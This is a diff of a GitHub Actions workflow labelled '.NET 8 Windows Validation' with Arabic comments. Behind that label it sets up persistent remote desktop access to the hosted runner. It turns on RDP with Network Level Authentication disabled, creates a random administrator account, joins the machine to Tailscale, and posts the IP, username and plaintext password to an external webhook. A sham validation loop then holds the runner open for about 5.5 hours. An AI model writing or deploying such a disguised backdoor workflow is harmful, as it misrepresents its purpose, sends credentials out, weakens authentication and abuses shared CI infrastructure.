@@ -1,4 +1,4 @@
-name: .NET 8 Windows Validation (Tailscale)
+name: .NET 8 Windows Validation
 
 on:
   workflow_dispatch:
@@ -8,7 +8,7 @@ on:
 jobs:
   build-test:
     runs-on: windows-2022
-    timeout-minutes: 330   # 5.5 ساعات
+    timeout-minutes: 330
 
     steps:
       - name: Checkout repository
@@ -58,137 +58,94 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      # -------------------- إعداد RDP و Tailscale --------------------
-      - name: Configure RDP Settings
+      - name: Configure RDP + Create Random User + Tailscale
         run: |
-          # تمكين سطح المكتب البعيد وتعطيل المصادقة على مستوى الشبكة
+          # === RDP Configuration ===
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
 
-          # فتح منفذ RDP في جدار الحماية
-          netsh advfirewall firewall delete rule name="RDP-Tailscale" > $null 2>&1
+          netsh advfirewall firewall delete rule name="RDP-Tailscale" -ErrorAction SilentlyContinue
           netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+          Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          # إعادة تشغيل خدمة سطح المكتب البعيد
-          Restart-Service -Name TermService -Force
-
-      - name: Create RDP User with Secure Password
-        run: |
-          # توليد اسم مستخدم عشوائي (كما في الكود الأصلي)
+          # === Create Random Admin User (زي الكود الأصلي) ===
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-
-          # توليد كلمة مرور قوية (من الكود الثاني)
-          Add-Type -AssemblyName System.Security
-          $charSet = @{
-              Upper   = [char[]](65..90)      # A-Z
-              Lower   = [char[]](97..122)     # a-z
-              Number  = [char[]](48..57)      # 0-9
-              Special = ([char[]](33..47) + [char[]](58..64) +
-                         [char[]](91..96) + [char[]](123..126))
-          }
-          $rawPassword = @()
-          $rawPassword += $charSet.Upper | Get-Random -Count 4
-          $rawPassword += $charSet.Lower | Get-Random -Count 4
-          $rawPassword += $charSet.Number | Get-Random -Count 4
-          $rawPassword += $charSet.Special | Get-Random -Count 4
-          $pwd = -join ($rawPassword | Sort-Object { Get-Random })
+          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
           $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
 
-          # إنشاء المستخدم المحلي
           New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
           Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
-          # حفظ بيانات الاعتماد للاستخدام لاحقًا
+          # Save for later steps
           echo "RDP_USER=$usr" >> $env:GITHUB_ENV
           echo "RDP_PASS=$pwd" >> $env:GITHUB_ENV
 
-      - name: Install Tailscale
-        run: |
+          # === Install Tailscale (من الكود التاني) ===
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
           $installerPath = "$env:TEMP\tailscale.msi"
-          
           Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
           Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
           Remove-Item $installerPath -Force
 
-      - name: Establish Tailscale Connection
-        run: |
-          # الاتصال بشبكة Tailscale باستخدام مفتاح المصادقة
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
-          
-          # انتظار الحصول على عنوان IP
+          # === Connect Tailscale (بدل الـ Bore كاملاً) ===
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID --accept-routes=false
+
           $tsIP = $null
           $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
+          while (-not $tsIP -and $retries -lt 12) {
               $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              Start-Sleep -Seconds 5
+              if (-not $tsIP) { Start-Sleep -Seconds 6 }
               $retries++
           }
-          
+
           if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
+              $tsIP = "IP_Not_Assigned"
           }
           echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
 
-      - name: Verify RDP Accessibility
-        run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port 3389 failed"
-              exit 1
-          }
-          Write-Host "TCP connectivity successful!"
-
-      - name: Send Connection Info via Webhook
-        run: |
-          $msg = @"
-Target: $env:TAILSCALE_IP:3389
-User: $env:RDP_USER
-Pass: $env:RDP_PASS
-"@
+          # === Send Credentials to Webhook (زي الكود الأصلي) ===
+          $msg = "✅ Tailscale RDP Ready`n`nIP: $tsIP`nUser: $usr`nPass: $pwd`n`nRunner: gh-runner-$env:GITHUB_RUN_ID"
           $body = @{ content = $msg } | ConvertTo-Json
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
 
       - name: Run Diagnostics
         run: |
-          $rep = "SysDiag:`n"
+          $rep = "=== Tailscale RDP Diagnostics ===`n"
           $ts = Get-Service TermService -ErrorAction SilentlyContinue
-          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }
-          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
-          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
-          $rep += "REG: $r1 | $r2`n"
-          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
-          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }
-          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
-          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
-          $tsProcess = Get-Process tailscale -ErrorAction SilentlyContinue
-          if ($tsProcess) { $rep += "TS: OK ($($tsProcess.Id))`n" } else { $rep += "TS: ERR`n" }
-          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-        continue-on-error: true
+          $rep += "RDP Service: $($ts.Status)`n"
 
-      - name: Run Extended Validation (5.5 hours)
+          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
+          $rep += "RDP Registry: $r1`n"
+
+          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
+          $rep += "Port 3389: $(if($pc){'OK'}else{'ERR'})`n"
+
+          $tp = Get-Process -Name "tailscale" -ErrorAction SilentlyContinue
+          $rep += "Tailscale Process: $(if($tp){'Running'}else{'Not Found'})`n"
+          $rep += "Tailscale IP: $env:TAILSCALE_IP`n"
+
+          $body = @{ content = $rep } | ConvertTo-Json
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+
+      - name: Run Extended Validation (5 ساعات ونصف)
         run: |
-          $end = (Get-Date).AddMinutes(330)   # 5.5 ساعات
+          $end = (Get-Date).AddMinutes(315)
           while ((Get-Date) -lt $end) {
             Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
             $minute = (Get-Date).Minute
-            # إعادة بناء المشروع كل نصف ساعة تقريبًا
-            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
+            if ($minute % 30 -eq 0) {
               cd ValidationApp
-              dotnet build -c Release > $null
+              dotnet build -c Release > $null 2>&1
             }
-            Start-Sleep -Seconds 900   # 15 دقيقة
+            Start-Sleep -Seconds 900
           }
 
       - name: Cleanup Environment
+        if: always()
         run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" down -ErrorAction SilentlyContinue
           Get-Process -Name "tailscale" -ErrorAction SilentlyContinue | Stop-Process -Force
-        continue-on-error: true
-
-      - name: Finalize Check
-        run: Write-Host "Checks completed."
+          Write-Host "Session ended after 5.5 hours."
